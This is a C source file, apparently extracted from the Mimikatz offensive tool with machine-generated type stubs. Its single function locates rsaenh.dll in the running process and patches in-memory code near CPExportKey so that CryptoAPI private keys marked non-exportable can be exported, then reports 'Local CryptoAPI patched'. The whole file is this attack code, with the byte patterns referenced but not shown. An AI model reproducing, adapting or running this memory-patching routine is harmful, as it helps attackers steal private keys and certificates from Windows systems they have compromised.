
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_27__ TYPE_9__ ;
typedef struct TYPE_26__ TYPE_8__ ;
typedef struct TYPE_25__ TYPE_7__ ;
typedef struct TYPE_24__ TYPE_6__ ;
typedef struct TYPE_23__ TYPE_5__ ;
typedef struct TYPE_22__ TYPE_4__ ;
typedef struct TYPE_21__ TYPE_3__ ;
typedef struct TYPE_20__ TYPE_2__ ;
typedef struct TYPE_19__ TYPE_1__ ;
typedef struct TYPE_18__ TYPE_11__ ;
typedef struct TYPE_17__ TYPE_10__ ;


typedef int wchar_t ;
struct TYPE_22__ {scalar_t__ address; } ;
struct TYPE_27__ {TYPE_4__ DllBase; scalar_t__ SizeOfImage; } ;
struct TYPE_25__ {int off0; } ;
struct TYPE_24__ {int Length; int Pattern; } ;
struct TYPE_23__ {int Length; int Pattern; } ;
struct TYPE_26__ {TYPE_7__ Offsets; TYPE_6__ Patch; TYPE_5__ Search; } ;
struct TYPE_21__ {scalar_t__ size; } ;
struct TYPE_20__ {int * member_1; scalar_t__ member_0; } ;
struct TYPE_19__ {int member_1; TYPE_2__ member_0; } ;
struct TYPE_18__ {int address; int * member_1; int * member_0; } ;
struct TYPE_17__ {TYPE_3__ kull_m_memoryRange; int * member_1; TYPE_1__ member_0; } ;
typedef TYPE_8__* PKULL_M_PATCH_GENERIC ;
typedef scalar_t__ PBYTE ;
typedef int NTSTATUS ;
typedef TYPE_9__ KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION ;
typedef TYPE_10__ KULL_M_MEMORY_SEARCH ;
typedef TYPE_11__ KULL_M_MEMORY_ADDRESS ;


 int ARRAYSIZE (int ) ;
 int Capi4000References ;
 int Capi4001References ;
 int KULL_M_MEMORY_GLOBAL_OWN_HANDLE ;
 scalar_t__ K_CPExportKey ;
 int MIMIKATZ_NT_BUILD_NUMBER ;
 int PRINT_ERROR_AUTO (char*) ;
 int STATUS_SUCCESS ;
 int kprintf (char*) ;
 scalar_t__ kull_m_patch (TYPE_10__*,TYPE_11__*,int ,TYPE_11__*,int ,int ,int *,int ,int *,int *) ;
 TYPE_8__* kull_m_patch_getGenericFromBuild (int ,int ,int ) ;
 scalar_t__ kull_m_process_getVeryBasicModuleInformationsForName (int *,char*,TYPE_9__*) ;

NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
{
 KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModuleRsaEnh;
 KULL_M_MEMORY_ADDRESS
  aPattern4001Memory = {((void*)0), &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
  aPattern4000Memory = {((void*)0), &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
  aPatch4001Memory = {((void*)0), &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
  aPatch4000Memory = {((void*)0), &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 KULL_M_MEMORY_SEARCH sMemory = {{{K_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, ((void*)0)};
 PKULL_M_PATCH_GENERIC currentReference4001, currentReference4000;

 currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), MIMIKATZ_NT_BUILD_NUMBER);
 currentReference4000 = kull_m_patch_getGenericFromBuild(Capi4000References, ARRAYSIZE(Capi4000References), MIMIKATZ_NT_BUILD_NUMBER);
 if(currentReference4001 && currentReference4000)
 {
  aPattern4001Memory.address = currentReference4001->Search.Pattern;
  aPattern4000Memory.address = currentReference4000->Search.Pattern;
  aPatch4001Memory.address = currentReference4001->Patch.Pattern;
  aPatch4000Memory.address = currentReference4000->Patch.Pattern;
  if(kull_m_process_getVeryBasicModuleInformationsForName(&KULL_M_MEMORY_GLOBAL_OWN_HANDLE, L"rsaenh.dll", &iModuleRsaEnh))
  {
   sMemory.kull_m_memoryRange.size = iModuleRsaEnh.SizeOfImage - ((PBYTE) K_CPExportKey - (PBYTE) iModuleRsaEnh.DllBase.address);

   if( kull_m_patch(&sMemory, &aPattern4001Memory, currentReference4001->Search.Length, &aPatch4001Memory, currentReference4001->Patch.Length, currentReference4001->Offsets.off0, ((void*)0), 0, ((void*)0), ((void*)0)) &&
    kull_m_patch(&sMemory, &aPattern4000Memory, currentReference4000->Search.Length, &aPatch4000Memory, currentReference4000->Patch.Length, currentReference4000->Offsets.off0, ((void*)0), 0, ((void*)0), ((void*)0)) )
    kprintf(L"Local CryptoAPI patched\n");
   else
    PRINT_ERROR_AUTO(L"kull_m_patch");

  } else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
 }
 return STATUS_SUCCESS;
}
